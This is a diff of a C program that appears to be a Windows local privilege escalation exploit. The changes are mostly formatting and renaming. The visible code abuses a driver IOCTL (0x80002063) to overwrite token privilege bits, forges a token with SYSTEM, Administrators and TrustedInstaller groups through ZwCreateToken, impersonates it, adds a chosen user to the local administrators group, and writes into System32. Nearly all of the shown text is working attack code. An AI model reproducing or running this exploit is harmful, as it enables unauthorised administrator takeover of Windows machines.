@@ -145,13 +145,13 @@ HRESULT GetSid(
 void
 get_system_privileges(PTOKEN_PRIVILEGES privileges)
 {
-	
+
 	LUID luid;
 	privileges->PrivilegeCount = 4;
 	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
 	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 	privileges->Privileges[0].Luid = luid;
-		LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
+	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
 	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
 	privileges->Privileges[1].Luid = luid;
 	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
@@ -259,7 +259,7 @@ PTOKEN_PRIVILEGES SetPrivileges()
 	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
 	privileges->Privileges[2].Luid = luid;
 
-	
+
 
 	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
 	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
@@ -326,7 +326,7 @@ QWORD TokenAddressCurrentProcess(HANDLE hProcess, DWORD MyProcessID)
 	for (i = 0; i < pSysHandleInfo->NumberOfHandles; i++)
 	{
 
-		if (pSysHandleInfo->Handles[i].ProcessId == MyProcessID && pSysHandleInfo->Handles[i].Handle ==(int) hToken)
+		if (pSysHandleInfo->Handles[i].ProcessId == MyProcessID && pSysHandleInfo->Handles[i].Handle == (int)hToken)
 		{
 			TokenAddress = pSysHandleInfo->Handles[i].Object;
 		}
@@ -347,7 +347,6 @@ CreateUserToken(HANDLE base_token, wchar_t *username)
 	NTSTATUS ntStatus;
 	LARGE_INTEGER li;
 	PLARGE_INTEGER pli;
-	DWORD sessionId;
 	HANDLE elevated_token;
 	PTOKEN_STATISTICS stats;
 	PTOKEN_PRIVILEGES privileges;
@@ -359,33 +358,24 @@ CreateUserToken(HANDLE base_token, wchar_t *username)
 	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
 	SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
 	PSID_AND_ATTRIBUTES pSid;
-	PISID pSidSingle;
 	TOKEN_USER userToken;
 	TOKEN_SOURCE sourceToken = { {'C', 'r', 'e', 'd', 'P', 'r', 'o', 0}, {0, 0} };  //{ { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };
-	
-	PSID lpSidOwner = NULL;
-	LUID authid = SYSTEM_LUID;
+
+        LUID authid = SYSTEM_LUID;
 	// Win 10/2019 >= 1809 set ANONYMOUS_LOGON_LUID
-  //LUID authid = ANONYMOUS_LOGON_LUID;
+        //LUID authid = ANONYMOUS_LOGON_LUID;
 	_ZwCreateToken ZwCreateToken;
 	PSID mysid;
 	SID_BUILTIN TkSidLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, DOMAIN_ALIAS_RID_ADMINS } };
 	SID_INTEGRITY IntegritySIDHigh = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_HIGH_RID };
 	SID_INTEGRITY IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };
 	SID_INTEGRITY IntegritySIDMedium = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };
-	
+
 	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
 	if (ZwCreateToken == NULL) {
 		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
 		return NULL;
 	}
-
-	DWORD dwBufferSize = 0;
-	PTOKEN_USER user;
-	user = (PTOKEN_USER)GetInfoFromToken(base_token, TokenUser);
-
-	AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID,
-		0, 0, 0, 0, 0, 0, 0, &lpSidOwner);
 
 	
 	userToken.User.Attributes = 0;
@@ -397,11 +387,11 @@ CreateUserToken(HANDLE base_token, wchar_t *username)
 	stats = (PTOKEN_STATISTICS)GetInfoFromToken(base_token, TokenStatistics);
 	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
 	get_system_privileges(privileges);
-	PSID p, p2;
+	PSID group1, group2;
 	// TrustedInstaller SID
-	BOOL t = ConvertStringSidToSidA("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &p2);
+	BOOL t = ConvertStringSidToSidA("S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464", &group2);
 	// Local Admin SID
-	t = ConvertStringSidToSidA("S-1-5-32-544", &p);
+	t = ConvertStringSidToSidA("S-1-5-32-544", &group1);
 	groups = (PTOKEN_GROUPS)GetInfoFromToken(base_token, TokenGroups);
 	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(base_token, TokenPrimaryGroup);
 	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(base_token, TokenDefaultDacl);
@@ -412,18 +402,18 @@ CreateUserToken(HANDLE base_token, wchar_t *username)
 		// change IL
 		//if (pSid->Attributes & SE_GROUP_INTEGRITY)
 		//	memcpy(pSid->Sid, &IntegritySIDMedium, sizeof(IntegritySIDMedium));
-		
-  		PISID piSid = (PISID)pSid->Sid;
+
+		PISID piSid = (PISID)pSid->Sid;
 		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS) {
-			pSid->Sid = p;
+			pSid->Sid = group1;
 			pSid->Attributes = SE_GROUP_ENABLED;
 		}
 
-		
+
 		else if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == SECURITY_WORLD_RID) {
-				pSid->Sid = p2;
-				pSid->Attributes = SE_GROUP_ENABLED;
-			}
+			pSid->Sid = group2;
+			pSid->Attributes = SE_GROUP_ENABLED;
+		}
 		else {
 			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
 			pSid->Attributes &= ~SE_GROUP_ENABLED;
@@ -432,7 +422,7 @@ CreateUserToken(HANDLE base_token, wchar_t *username)
 
 	owner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
 	owner->Owner = mysid;
-	DWORD Size=0;
+	DWORD Size = 0;
 	pluidAuth = &authid;
 	li.LowPart = 0xFFFFFFFF;
 	li.HighPart = 0xFFFFFFFF;
@@ -450,16 +440,15 @@ CreateUserToken(HANDLE base_token, wchar_t *username)
 		owner,
 		primary_group,
 		default_dacl,
-		&sourceToken 
+		&sourceToken
 	);
-	
+
 
 	if (ntStatus == STATUS_SUCCESS)
 		return elevated_token;
 	else
 		printf("[-] Failed to create new token: %d %08x\n", GetLastError(), ntStatus);
 
-	FreeSid(lpSidOwner);
 	if (stats) LocalFree(stats);
 	if (groups) LocalFree(groups);
 	if (privileges) LocalFree(privileges);
@@ -531,13 +520,13 @@ int wmain(int argc, wchar_t *argv[])
 		printf("\n[*] Overwriting _SEP_TOKEN_PRIVILEGES bits");
 		DeviceIoControl(hDevice, 0x80002063, NULL, 0, (LPVOID)PresentByteOffset, 0, &dwRetBytes, NULL);
 		DeviceIoControl(hDevice, 0x80002063, NULL, 0, (LPVOID)EnableByteOffset, 0, &dwRetBytes, NULL);
-		hTokenElevate=CreateUserToken(hTokenCurrent,argv[1]);
+		hTokenElevate = CreateUserToken(hTokenCurrent, argv[1]);
 		Sleep(500);
 	} while (hTokenElevate == NULL);
 	HANDLE duped_token;
 	/*
 	BOOL res = DuplicateTokenEx(hTokenElevate,
-		
+
 		TOKEN_ALL_ACCESS,
 		NULL,
 		SecurityImpersonation,
@@ -545,20 +534,20 @@ int wmain(int argc, wchar_t *argv[])
 		&duped_token);*/
 	HANDLE hCurrentThread = GetCurrentThread();
 	if (SetThreadToken(&hCurrentThread, hTokenElevate) == 0) {
-		printf("Impersonation failed: %d\n", GetLastError());
+		printf("[-] Impersonation failed: %d\n", GetLastError());
 	}
 	else {
 		printf("[+] SetThreadToken with elevated token: Impersonation successful!\n");
 		GetUser();
 		LOCALGROUP_INFO_1         localgroup_info;
 		LOCALGROUP_MEMBERS_INFO_3 localgroup_members;
-		localgroup_members.lgrmi3_domainandname =argv[1];
+		localgroup_members.lgrmi3_domainandname = argv[1];
 		int err = NetLocalGroupAddMembers(L".",
 			L"administrators",
 			3,
 			(LPBYTE)&localgroup_members,
 			1);
-		printf("[+] Added user: %S to administrator groups result:%d\n", argv[1], err);
+		printf("[i] Added user: %S to administrator groups result:%d\n", argv[1], err);
 		DWORD dBytesWritten;
 		HANDLE hFile = CreateFile(L"C:\\windows\\system32\\test.txt",                // name of the write
 			GENERIC_WRITE,          // open for writing
@@ -567,7 +556,7 @@ int wmain(int argc, wchar_t *argv[])
 			CREATE_ALWAYS,             // create new file only
 			FILE_ATTRIBUTE_NORMAL,  // normal file
 			NULL);
-		printf("Write file c:\\windows\\system32\\test.txt last error:%d\n", GetLastError());
+		printf("[i] Write file c:\\windows\\system32\\test.txt last error:%d\n", GetLastError());
 
 
 	}
